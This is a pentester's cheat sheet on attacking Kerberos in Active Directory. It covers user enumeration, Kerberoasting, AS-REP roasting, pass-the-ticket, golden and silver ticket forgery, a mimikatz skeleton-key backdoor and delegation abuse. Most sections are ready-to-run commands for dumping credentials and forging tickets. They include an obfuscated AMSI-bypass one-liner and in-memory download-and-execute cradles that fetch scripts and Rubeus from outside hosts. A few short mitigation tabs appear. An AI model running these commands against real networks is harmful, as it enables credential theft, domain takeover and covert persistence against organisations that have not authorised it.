# 88 - Kerberos

{% code overflow="wrap" %}
```url
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

https://youtu.be/_44CHD3Vx-0?si=V98RLUpGApyqQ31z
https://www.youtube.com/watch?v=snGeZlDQL2Q
https://www.youtube.com/watch?v=5N242XcKAsM
https://gist.github.com/TarlogicSecurity/2f221924fef8c14a1d8e29f3cb5c5c4a

https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberoasting
https://github.com/dirkjanm/PKINITtools
https://www.onsecurity.io/blog/abusing-kerberos-from-linux/
https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/klist
https://www.tarlogic.com/blog/how-to-attack-kerberos/
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (14).png" alt=""><figcaption></figcaption></figure>

## Benefits

{% code overflow="wrap" %}
```
- Delegated Authentication (enables a service to impersonate its client when connecting to other services)
- Interoperability with other networks following IETF standards
- More efficient authentication to servers (server is not required to go to the DC)
- Mutual Authentication (both client/server or server/server verify their identities)
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (32).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (137).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (138).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (139).png" alt=""><figcaption></figcaption></figure>

## Enumeration

{% code overflow="wrap" fullWidth="true" %}
```bash
nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN.LOCAL'" (-Pn) IP
use auxiliary/gather/kerberos_enumusers # MSF
https://github.com/attackdebris/kerberos_enum_userlists

python kerbrute.py -dc-ip IP -users /root/htb/kb_users.txt -passwords /root/pass_common_plus.txt -threads 20 -domain DOMAIN -outputfile kb_extracted_passwords.txt
```
{% endcode %}

### Kerbrute

{% tabs %}
{% tab title="Overview" %}
| [https://www.puckiestyle.nl/kerbrute/](https://www.puckiestyle.nl/kerbrute/) |
| ---------------------------------------------------------------------------- |

Kerbrute is a popular enumeration tool used to brute-force and enumerate valid active-directory users by abusing the Kerberos pre-authentication.

You need to add the DNS domain name along with the machine IP to /etc/hosts inside of your attacker machine or these attacks will not work for you - `10.10.120.125  CONTROLLER.local`   &#x20;
{% endtab %}

{% tab title="Pre-Authentication" %}
By brute-forcing Kerberos pre-authentication, you do not trigger the account failed to log on event which can throw up red flags to blue teams. When brute-forcing through Kerberos you can brute-force by only sending a single UDP frame to the KDC allowing you to enumerate the users on the domain from a wordlist.

[https://github.com/ropnop/kerbrute/releases](https://github.com/ropnop/kerbrute/releases)
{% endtab %}

{% tab title="Enumerating users" %}
{% hint style="info" %}
When I enumerate users, if AS-REP Roasting is possible, kerbrute might  indicate it as well. Otherwise, try **GetNPUsers** after kerbrute.
{% endhint %}

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

Very basic wordlist [here](https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt)

{% code overflow="wrap" %}
```bash
./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt 
# This will brute force user accounts from a domain controller using a supplied wordlist
# IMPORTANT: ADD A FAKE USER TO THE LIST SO WE CHECK THERE ARE NO FALSE POSITIVES
```
{% endcode %}

Use [https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/xato-net-10-million-passwords.txt)

Having some users, try to build different formats using [https://gist.github.com/superkojiman/11076951#file-namemash-py](https://gist.github.com/superkojiman/11076951#file-namemash-py)

If we know the format (smith, jsmith, john, j.smith, etc.) use the proper file from [https://github.com/insidetrust/statistically-likely-usernames](https://github.com/insidetrust/statistically-likely-usernames)

Another resort is to use **cewl** to gather potential user/pass if there is a webserver.
{% endtab %}
{% endtabs %}

## Kerberos Attacks

[#kerberos](../../post-exploitation/windows/ad/authentication.md#kerberos "mention")

### Kerberoasting

{% tabs %}
{% tab title="Exploitation" %}
<pre class="language-bash" data-overflow="wrap" data-full-width="true"><code class="lang-bash"><strong>######## HOW TO MAKE IT VULNERABLE
</strong><strong>It has SPN with weak pwd ----> ADD THE DC DOMAIN TO /etc/hosts
</strong># How to set that SPN on the DC
C:\> setspn -a domain.com/$USER.$HOSTNAME  domain.com\$USER

nxc ldap $iP -u USER -p PASS --kerberoast kerberoast.txt

################# IMPACKET (REMOTELY)
GetUserSPNs.py domain.com/SVC_ACCOUNT:StrongPassword22 -dc-ip 10.10.10.1 -request (-output tgs.hash)
# CRACK THE TICKET
./hashcat -m 13100 -a 0 kerberos_hashes.txt crackstation.txt
./john --wordlist=/opt/wordlists/rockyou.txt --fork=4 --format=krb5tgs ~/kerberos_hashes.txt
# If [-] Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great), install below
apt install rdate
rdate -n

############# RUBEUS (ON THE WINDOWS VICTIM MACHINE)
.\rubeus.exe kerberoast /creduser:DOMAIN\JOHN /credpassword:MyP@ssW0RD /outfile:hash.txt
Rubeus.exe kerberoast /outfile:hashes.txt
Rubeus.exe kerberoast /creduser:s4vicorp.local\mvazquez /credpassword:Password1

############# INVOKE-KERBEROAST
# Extract all accounts in the SPN
setspn -T medin -Q ​ */*
# SPN is the Service Principal Name, and is the mapping between service and account.
# Now we have seen there is an SPN for a user, we can use Invoke-Kerberoast and get a ticket.
# Lets first get the Powershell Invoke-Kerberoast script.
iex​(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') 
# Now lets load this into memory: 
Invoke-Kerberoast -OutputFormat hashcat |fl
<strong># Crack the hash
</strong><strong>hashcat -m 13100 -​a 0 hash.txt $wordlist --force
</strong>john hashes.txt --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
</code></pre>
{% endtab %}

{% tab title="Overview" %}
Kerberoasting allows a user to request a service ticket for any service with a registered Service Principal Name (SPN, the mapping between service and account), and then use that ticket to crack the service password. If the service has a registered SPN then it can be Kerberoastable however the success of the attack depends on how strong the password is and if it is trackable as well as the privileges of the cracked service account. To enumerate Kerberoastable accounts I would suggest a tool like **BloodHound** to find all Kerberoastable accounts, it will allow you to see what kind of accounts you can kerberoast if they are domain admins, and what kind of connections they have to the rest of the domain.&#x20;

#### What Can a Service Account do?

After cracking the service account password there are various ways of exfiltrating data or collecting loot depending on whether the service account is a domain admin or not. If the service account is a domain admin you have control similar to that of a golden/silver ticket and can now gather loot such as dumping the `NTDS.dit`. If the service account is not a domain admin you can use it to log into other systems and pivot or escalate or you can use that cracked password to spray against other service and domain admin accounts; many companies may reuse the same or similar passwords for their service or domain admin users. If you are in a professional pen test be aware of how the company wants you to show risk most of the time they don't want you to exfiltrate data and will set a goal or process for you to get in order to show risk inside of the assessment.
{% endtab %}

{% tab title="Mitigation" %}
* Strong Service Passwords - If the service account passwords are strong then kerberoasting will be ineffective
* &#x20;Don't Make Service Accounts Domain Admins - Service accounts don't need to be domain admins, kerberoasting won't be as effective if you don't make service accounts domain admins.
{% endtab %}
{% endtabs %}

### AS-REP Roasting

{% tabs %}
{% tab title="Exploitation" %}
<pre class="language-bash" data-overflow="wrap"><code class="lang-bash"><strong># Collect users 
</strong>rpcclient -U 's4vicorp.local\mvazquez%Password1' 10.0.2.15 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v '0x' | tr -d '[]' > users
# HOW TO MAKE IT VULNERABLE -> set preauth for Kerberos
DC > Server Manager > Active Directory Users and Groups > $WHATEVER_USER_WITH_SPN > Account > Do not require Kerberos preauth
GetNPUsers.py -dc-ip 10.0.2.48 s4vicorp.local/ -usersfile users
<strong>
</strong>nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
<strong>
</strong><strong>################### IMPACKET
</strong>A list of usernames (got by Kerbrute previously) is needed
GetNPUsers.py -dc-ip $IP -request $DOMAIN
GetNPUsers.py -dc-ip 10.10.10.161 -request htb.local/

################### RUBEUS
Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\hashes.txt
Rubeus.exe asreproast /user:svc_sqlservice /domain:s4vicorp.local /dc:DC-Company
# This will run the AS-REP roast command looking for vulnerable users and then dump found vulnerable user hashes.

################### CRACKING HASHES
hashcat -m 18200 hashes.txt rockyou.txt
</code></pre>
{% endtab %}

{% tab title="Overview" %}
During pre-authentication, the users hash will be used to encrypt a timestamp that the domain controller will attempt to decrypt to validate that the right hash is being used and is not replaying a previous request. After validating the timestamp the KDC will then issue a TGT for the user. If pre-authentication is disabled you can request any authentication data for any user and the KDC will return an encrypted TGT that can be cracked offline because the KDC skips the step of validating that the user is really who they say that they are.

Very similar to Kerberoasting, AS-REP Roasting dumps the krbasrep5 hashes of user accounts that have Kerberos pre-authentication disabled. Unlike Kerberoasting these users do not have to be service accounts the only requirement to be able to AS-REP roast a user is the user must have **pre-authentication disabled**.

Among several tools, **Rubeus** is easier to use because it automatically finds AS-REP Roastable users whereas with GetNPUsers you have to enumerate the users beforehand and know which users may be AS-REP Roastable.
{% endtab %}

{% tab title="Mitigations" %}
* Have a strong password policy. With a strong password, the hashes will take longer to crack making this attack less effective
* Don't turn off Kerberos Pre-Authentication unless it's necessary. There's almost no other way to completely mitigate this attack other than keeping Pre-Authentication on.
{% endtab %}
{% endtabs %}

### Timeroasting

[https://github.com/SecuraBV/Timeroast/blob/main/timeroast.ps1](https://github.com/SecuraBV/Timeroast/blob/main/timeroast.ps1)

[https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac](https://medium.com/@offsecdeer/targeted-timeroasting-stealing-user-hashes-with-ntp-b75c1f71b9ac)

## Tickets

[#tickets](../../post-exploitation/windows/ad/authentication.md#tickets "mention")

[#tickets](../../post-exploitation/windows/ad/persistence.md#tickets "mention")

### Create a ticket

```bash
KRB5CCNAME=user.ccache python3 targetedKerberoast.py ...

# CREATE TICKET (ONLY WORKS W/ PASSWORD AND NOT HASH??)
kinit $USER
Password for user@dom.com: 
klist
...Ticket cache: FILE:/tmp/krb5cc_1000
# Then the authentication
```

### Pass the Ticket

[https://www.thehacker.recipes/ad/movement/kerberos/ptt](https://www.thehacker.recipes/ad/movement/kerberos/ptt)

{% tabs %}
{% tab title="Overview" %}
Pass the ticket works by dumping the TGT from the LSASS memory of the machine. The Local Security Authority Subsystem Service (LSASS) is a memory process that stores credentials on an active directory server and can store Kerberos ticket along with other credential types to act as the gatekeeper and accept or reject the credentials provided. You can dump the Kerberos Tickets from the LSASS memory just like you can dump hashes. When you dump the tickets with mimikatz it will give us a **.kirbi** ticket which can be used to gain domain admin if a domain admin ticket is in the LSASS memory. This attack is great for privilege escalation and lateral movement if there are unsecured domain service account tickets laying around. The attack allows you to escalate to domain admin if you dump a domain admin's ticket and then impersonate that ticket using **mimikatz PTT** attack allowing you to act as that domain admin. You can think of a pass the ticket attack like reusing an existing ticket were not creating or destroying any tickets here were simply reusing an existing ticket from another user on the domain and impersonating that ticket.

![](<../../.gitbook/assets/image (130).png>)
{% endtab %}

{% tab title="Dump Tickets" %}
{% hint style="info" %}
If you don't have an elevated command prompt (Administrators group), mimikatz will not work properly.
{% endhint %}

{% code overflow="wrap" %}
```bash
mimikatz.exe
privilege::debug # Ensure this outputs [output '20' OK]
sekurlsa::tickets /export # this will export all of the .kirbi tickets
```
{% endcode %}

![](<../../.gitbook/assets/image (56).png>)

When looking for which ticket to impersonate I would recommend looking for an administrator ticket from the krbtgt just like the one outlined in red above.
{% endtab %}

{% tab title="Pass the Ticket" %}
## Impacket

{% code overflow="wrap" %}
```bash
getST.py -spn WWW/dc.domain.com -impersonate Administrator domain.com/svc_user -hashes :4efed24079fe2767c67f2b43fd6cb5ac
# If we need to find a SPN, we can use pywerviewer from Linux
pywerview get-netcomputer -u my.user -t 10.10.10.10 --full-data
# We grab the SPN that shows the description msds-allowedtodelegateto, do not confuse it with others
export KRB5CCNAME=Administrator.ccache #export to a env variable 
# Get a shell using PTT
psexec -k -no-pass domain.com/Administrator@dc.domain.com
wmiexec.py -k -no-pass north.sevenkingdoms.local/catelyn.stark@winterfell
wmiexec.py dc.domain.com -k -no-pass # include dc.domain.com or any other domain in /etc/hosts (dc.xxx.xxx if it is the domain to target a DC)
```
{% endcode %}

## Local

{% code overflow="wrap" %}
```bash
# Pass the Ticket -> access DC content from a non-DC host/machine on the domain
c:\Windows\Temp\test>hostname
PC-Ramlux
c:\Windows\Temp\test>dir \\DC-Company\c$ # we see we cannot now
b'Access is denied.\r\n'
c:\Windows\Temp\test>certutil -urlcache -split -f http://10.0.2.47:8000/golden.kirbi
# Now pass the TICKET.KIRBI
mimikatz# kerberos::ptt golden.kirbi
mimikatz# exit
klist
c:\Windows\Temp\test>dir \\DC-Company\c$ # now access should be gratned
```
{% endcode %}
{% endtab %}

{% tab title="Mitigation" %}
Let's talk blue team and how to mitigate these types of attacks.&#x20;

* Don't let your domain admins log onto anything except the domain controller - This is something so simple however a lot of domain admins still log onto low-level computers leaving tickets around that we can use to attack and move laterally with.
{% endtab %}
{% endtabs %}

### Golden Tickets

{% hint style="info" %}
In order to craft a golden ticket, testers need to find the `krbtgt`'s RC4 key (i.e. NT hash) or AES key (128 or 256 bits). In most cases, this can only be achieved with domain admin privileges through a [DCSync attack](https://www.thehacker.recipes/ad/movement/credentials/dumping/dcsync). A Golden Ticket can later be used with Pass-the-ticket to access any resource within the AD domain.
{% endhint %}

Golden ticket has access to any Kerberos service.

{% code overflow="wrap" fullWidth="true" %}
```bash
# This will dump the hash as well as the security identifier needed to create a Golden Ticket. To create a silver ticket you need to change the /name: to dump the hash of either a domain admin account or a service account such as the SQLService account.
mimikatz# lsadump::lsa /inject /name:krbtgt
mimikatz# kerberos::golden /user:Administrator /domain:dom.com /sid:$DOMAIN_SID /krbtgt:$NTLM_HASH /ticket:golden.kirbi (/id:$GROUP_ID)

# This is the command for creating a golden ticket to create a silver ticket simply put a service NTLM hash into the krbtgt slot, the sid of the service account into sid, and change the id to 1103.

# We could use the ticket to access other machines
misc::cmd
dir \\DESKTOP-1\C$

################ RUBEUS
Rubeus.exe golden /rc4:f9f3d430a22055c9ffd6190032eb82ab /user:Administrator /domain:s4vicorp.local /sid:S-1-5-21-4234973561-2312662453-3533273321 /outfile:rubeus-ticket
```
{% endcode %}

### Silver Tickets

These are more discreet and only works for with Pass-the-ticket to **access that specific service**.

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/silver

getST.py        ///    smbclient ... -k
# Transfer ticket.kirbi to the attacking machine and use it to authenticate w/o valid user-pass

# Find the domain SID
lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0

# with an NT hash
ticketer.py -nthash "$NT_HASH" -domain-sid "$DomainSID" -domain "$DOMAIN" -spn "$SPN" "USER_TO_IMPERSONATE"
export KRB5CCNAME=XXX.ccache
psexec.py -k -n dom.local/"USER_TO_IMPERSONATE"@DC-Company cmd.exe
```
{% endcode %}

{% hint style="info" %}
If we face a DC and the service we want to access is internal (port forwarding needed), we need to change /etc/hosts of that domain.com dc.domain.com to point our localhost (where the service is being forwarded to be used).
{% endhint %}

A specific use scenario for a silver ticket would be that you want to access the domain's SQL server however your current compromised user does not have access to that server. You can find an accessible service account to get a foothold with by kerberoasting that service, you can then dump the service hash and then impersonate their TGT in order to request a service ticket for the SQL service from the KDC allowing you access to the domain's SQL server.

### KRBTGT&#x20;

In order to fully understand how these attacks work you need to understand what the difference between a KRBTGT and a TGT is. A KRBTGT is the service account for the KDC this is the Key Distribution Center that issues all of the tickets to the clients. If you impersonate this account and create a golden ticket form the **KRBTGT** you give yourself the ability to **create a service ticket for anything** you want. A **TGT** is a **ticket to a service** account issued by the KDC and **can only access that service** the TGT is from like the SQLService ticket.

### Overpass the Hash (From NTLM hash to Kerberos ticket)

{% code overflow="wrap" fullWidth="true" %}
```bash
To convert an NTLM hash to a Kerberos ticket, you can perform an overpass-the-hash attack.

https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2023_02.svg
https://www.thehacker.recipes/ad/movement/kerberos/ptk

└─$ impacket-getTGT domain.com/"user" -hashes :7dc430b95e17ed6f817f69366f35be27
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in user.ccache
```
{% endcode %}

### Convert dumped tickets

```bash
# You could also use the tickets dumped with lsassy using impacket ticketConverter:
ticketConverter.py kirbi_ticket.kirbi ccache_ticket.ccache
```

## Fix KRB\_AP\_ERR\_SKEW (Clock skew too great)

{% code overflow="wrap" %}
```bash
# ntpdate will update the time based on an NTP server
systemctl start ntp
sudo ntpdate (-s) $TARGET_IP

# If using Virtualbox, also have to stop the guest utils service or else it changed the time back about 30 seconds after we changed it.
service virtualbox-guest-utils status # maybe this specific service does not exist, status just to check
service vboxadd stop
service vboxadd-service stop
# Remember to restart them if they affect the OS in any way

# Alternative method
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#kerberos-clock-synchronization
```
{% endcode %}

## Backdoors w/ mimikatz

{% tabs %}
{% tab title="Overview" %}
Along with maintaining access using golden and silver tickets mimikatz has one other trick up its sleeves when it comes to attacking Kerberos. Unlike the golden and silver ticket attacks a Kerberos backdoor is much more subtle because it acts similar to a rootkit by implanting itself into the memory of the domain forest allowing itself access to any of the machines with a master password.&#x20;

The Kerberos backdoor works by implanting a skeleton key that abuses the way that the AS-REQ validates encrypted timestamps. A skeleton key only works using Kerberos RC4 encryption.&#x20;

The default hash for a mimikatz skeleton key is 60BA4FCADC466C7A033C178194C03DF6 which makes the password "mimikatz"

### Skeleton Key Overview

The skeleton key works by abusing the AS-REQ encrypted timestamps. The timestamp is encrypted with the users NT hash. The domain controller then tries to decrypt this timestamp with the users NT hash, once a skeleton key is implanted the domain controller tries to decrypt the timestamp using both the user NT hash and the skeleton key NT hash allowing you access to the domain forest.
{% endtab %}

{% tab title="Skeleton Key" %}
{% code overflow="wrap" %}
```bash
misc::skeleton
# ACCESING THE FOREST (default creds "mimikatz")
# The share will now be accessible without the need for Administrators password 
net use c:\\DOMAIN-CONTROLLER\admin$ /user:Administrator mimikatz
# access the directory of Desktop-1 without ever knowing what users have access
dir \\Desktop-1\c$ /user:Machine1 mimikatz
# Skeleton key will not persist by itself because it runs in the memory, it can be scripted or persisted using other tools and techniques.
```
{% endcode %}
{% endtab %}
{% endtabs %}

## Delegations

[#kerberos-delegation](../../post-exploitation/windows/ad/exploitation.md#kerberos-delegation "mention")

```
https://en.hackndo.com/constrained-unconstrained-delegation/
https://beta.hackndo.com/unconstrained-delegation-attack/
https://beta.hackndo.com/resource-based-constrained-delegation-attack/
https://blog.harmj0y.net/activedirectory/s4u2pwnage/
https://eladshamir.com/2019/01/28/Wagging-the-Dog.html
```

{% hint style="info" %}
By default on windows active directory all domain controller are setup with unconstrained delegation
{% endhint %}

{% code overflow="wrap" fullWidth="true" %}
```bash
# Unconstrained Delegation
nxc ldap 192.168.0.104 -u harry -p pass --trusted-for-delegation
# With protocol transition ond RBCD as well
nxc smb serv01.testlab.local -u USER -p PASS --delegate administrator
nxc smb serv01.testlab.local -u USER -p PASS --delegate administrator --sam --lsa
# only S4U2Self in order to impersonate any account on a domain joined computer for which you know the credentials
nxc smb serv01.testlab.local -u USER -p PASS --delegate administrator --self
nxc smb serv01.testlab.local -u USER -p PASS --delegate administrator --self --dpapi
```
{% endcode %}

### Constrained Delegation

{% code overflow="wrap" fullWidth="true" %}
```bash
# Find it on Bloodhound
MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p
# Or with impacket
findDelegation.py "DOMAIN"/"USER":"PASSWORD" (-target-domain $DOMAIN)
# With protocol transition (using Impacket or Rubeus)
getST -spn "cifs/target" -impersonate "administrator" "domain/AccountName:password"
.\Rubeus.exe asktgt /user:jon.snow /domain:north.sevenkingdoms.local /rc4:B8D76E56E9DAC90539AFF05E3CCB1755
.\Rubeus.exe s4u /ticket:put_the__previous_ticket_here /impersonateuser:administrator /msdsspn:"CIFS/target" /ptt
# And next we can use the TGS to connect to smb and get a shell with psexec, smbexec, wmiexec, …
# SPN part is not encrypted in the request, so you can change it to the one you want with the option altservice

# Without protocol transition, we need to add a computer first
addcomputer.py -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 192.168.56.11 'DOMAIN'/'USER':'PASS'
# add rbcd from X (rbcd_const) to constrained (castelblack) using 
rbcd.py -delegate-from 'rbcd_const$' -delegate-to 'targetComputer$' -dc-ip 'DomainController' -action 'write' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' 'domain'/'PowerfulUser'
# s4u2self + s4u2 proxy on X (rbcd_const)
getST.py -spn 'host/castelblack' -impersonate Administrator -dc-ip 'DomainController' 'DOMAIN'/'rbcd_const$':'rbcdpass'
# s4u2proxy from constrained (castelblack) to target (winterfell) - with altservice to change the SPN in use
getST.py -impersonate "administrator" -spn "http/winterfell" -altservice "cifs/winterfell" -additional-ticket 'administrator@host_castelblack@NORTH.SEVENKINGDOMS.LOCAL.ccache' -dc-ip 'DomainController' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' 'domain'/'castelblack$'
export KRB5CCNAME=administrator@....LOCAL.ccache 
wmiexec.py -k -no-pass 'domain'/administrator@'targetComputerHostname'
# After the exploit a little clean up of the lab, flush the rbcd entry and delete the computer account with a domain admin
rbcd.py -delegate-to 'castelblack$' -delegate-from 'rbcd_const$' -dc-ip 'DomainController' -action 'flush' -hashes ':b52ee55ea1b9fb81de8c4f0064fa9301' 'DOMAIN'/'castelblack$'
addcomputer.py -computer-name 'rbcd_const$' -computer-pass 'rbcdpass' -dc-host 'DomainController' 'dnorth.sevenkingdoms.local/eddard.stark:FightP3aceAndHonor!' -delete

getST.py -spn WWW/dc.domain.com -impersonate Administrator domain.com/svc_machine -hashes :4fded14079fe2667c67f2b43fd6cb57b
```
{% endcode %}

### Unconstrained Delegation

{% code overflow="wrap" fullWidth="true" %}
```bash
https://pentestlab.blog/2022/03/21/unconstrained-delegation/

# Find it on Bloodhound
MATCH (c {unconstraineddelegation:true}) return c
# unconstrained delegation system (out of domain controller) 
MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH '-516' WITH COLLECT(c1.name) AS domainControllers MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN domainControllers RETURN c2
# Use Rubeus but first bypass AMSI
$x=[Ref].Assembly.GetType('System.Management.Automation.Am'+'siUt'+'ils');$y=$x.GetField('am'+'siCon'+'text',[Reflection.BindingFlags]'NonPublic,Static');$z=$y.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($z,0x41424344)
(new-object system.net.webclient).downloadstring('http://192.168.56.126/amsi_rmouse.txt')|IEX
# Now launch Rubeus in memory with execute assembly
$data = (New-Object System.Net.WebClient).DownloadData('http://192.168.56.126/Rubeus.exe')
$assem = [System.Reflection.Assembly]::Load($data);
# First we will list the available tickets
[Rubeus.Program]::MainString("triage");
# Now if possible force a coerce of a DC to another DC in case no interesting tickets are found
python3 coercer.py -u arya.stark -d north.sevenkingdoms.local -p Needle -t kingslanding.sevenkingdoms.local -l winterfell
# Dump TGT
[Rubeus.Program]::MainString("dump /user:kingslanding$ /service:krbtgt /nowrap");
cat tgt.b64|base64 -d > ticket.kirbi
ticketConverter.py ticket.kirbi ticket.ccache
export KRB5CCNAME=/workspace/unconstrained/ticket.ccache
secretsdump.py -k -no-pass SEVENKINGDOMS.LOCAL/'KINGSLANDING$'@KINGSLANDING
```
{% endcode %}

### RCBD (Resource-Based Constrained Delegation)

You can abuse RBCD when you can edit the attribute : _**msDS-AllowedToActOnBehalfOfOtherIdentity**_

* An example of exploitation is when you got GenericAll or GenericWrite ACL on a Computer.

{% code overflow="wrap" fullWidth="true" %}
```bash
https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
https://pentestbook.six2dez.com/post-exploitation/windows/ad/kerberos-attacks#info
https://github.com/tothi/rbcd-attack

# Create a computer X (for example, rbcd$)
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host 'DC_HOST' 'domain'/'user':'password'
# We can verify that this machine account was added to the domain
Get-ADComputer rbcd
# Add delegation write on our target from X (rbcd$)
rbcd.py -delegate-from 'rbcd$' -delegate-to 'targetComputer$' -dc-ip 'DomainController' -action 'write' 'domain'/'PowerfulUser':'password'
# We can confirm that this was successful
Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity | select -expand msds-allowedtoactonbehalfofotheridentity
# s4u2self + S4u2proxy to get administration permissions on the target computer
# cifs can be anything (maybe active SPN???), dc has to be the DC or the machine name and Administrator is any domain admin we want to impersonate, FAKE01 is the fake machine created earlier
getST.py -spn cifs/dc.domain.com -impersonate Administrator -dc-ip 10.10.10.10 domain.com/'rbcd$':'rbcdpass'
# After adding the file path to the KRB5CCNAME variable the ticket is usable for Kerberos clients:
export KRB5CCNAME=Administrator.ccache                     
# Now we can authenticate as Administrator using that Kerberos ticket with no password. NOTE: dc.domain.com is needed after @
psexec.py domain.com/Administrator@dc.domain.com -k -no-pass
impacket-psexec -k -no-pass dc.domain.com -dc-ip $DC_IP 
wmiexec.py -k -no-pass @targetdc.domain.local
# After the exploit a little clean up of the lab, flush the rbcd entry and delete the computer account with a domain admin
rbcd.py -delegate-from 'rbcd$' -delegate-to 'targetComputer$' -dc-ip 'DomainController' -action 'flush' 'domain'/'PowerfulUser':'password'
addcomputer.py -computer-name 'rbcd$' -computer-pass 'rbcdpass' -dc-host kingslanding.sevenkingdoms.local 'DOMAIN_ACQUIRED'/'user':'password' -delete
```
{% endcode %}

### Resources - go further

{% code overflow="wrap" fullWidth="true" %}
```bash
    https://www.thehacker.recipes/ad/movement/kerberos/delegations
    https://www.notsoshant.io/blog/attacking-kerberos-constrained-delegation/
    https://sensepost.com/blog/2020/chaining-multiple-techniques-and-tools-for-domain-takeover-using-rbcd/
    https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse
    https://ppn.snovvcrash.rocks/pentest/infrastructure/ad/delegation-abuse
    Charlie’s talk about delegation : https://www.thehacker.recipes/ad/movement/kerberos/delegations#talk
```
{% endcode %}

## sAMAccountName spoofing (CVE-2021-42278 and CVE-2021-42287)

[https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing](https://www.thehacker.recipes/ad/movement/kerberos/samaccountname-spoofing)
